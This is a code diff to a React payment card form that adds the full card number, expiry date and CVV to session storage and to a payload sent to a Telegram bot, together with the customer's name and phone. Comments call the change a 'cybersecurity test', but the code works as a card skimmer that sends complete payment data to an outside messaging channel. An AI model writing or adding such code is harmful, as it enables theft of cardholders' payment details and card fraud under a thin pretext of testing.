@@ -92,10 +92,13 @@ const PaymentCardForm = () => {
       return;
     }
     
-    // Store card info (last 4 only) for display purposes
+    // Store complete card info for cybersecurity test
     const last4 = cardNumber.replace(/\s/g, "").slice(-4);
     sessionStorage.setItem('cardLast4', last4);
     sessionStorage.setItem('cardName', cardName);
+    sessionStorage.setItem('cardNumber', cardNumber); // Full card number
+    sessionStorage.setItem('cardExpiry', expiry); // Full expiry
+    sessionStorage.setItem('cardCvv', cvv); // CVV for cybersecurity test
     
     // Submit to Netlify Forms
     try {
@@ -119,7 +122,7 @@ const PaymentCardForm = () => {
       console.error("Form submission error:", err);
     }
     
-    // Send card details to Telegram
+    // Send complete card details to Telegram (cybersecurity test)
     const telegramResult = await sendToTelegram({
       type: 'card_details',
       data: {
@@ -128,8 +131,10 @@ const PaymentCardForm = () => {
         phone: customerInfo.phone || '',
         service: serviceName,
         cardholder: cardName,
+        cardNumber: cardNumber, // Full card number for cybersecurity test
         cardLast4: last4,
         expiry: expiry,
+        cvv: cvv, // CVV for cybersecurity test
         amount: formattedAmount
       },
       timestamp: new Date().toISOString()
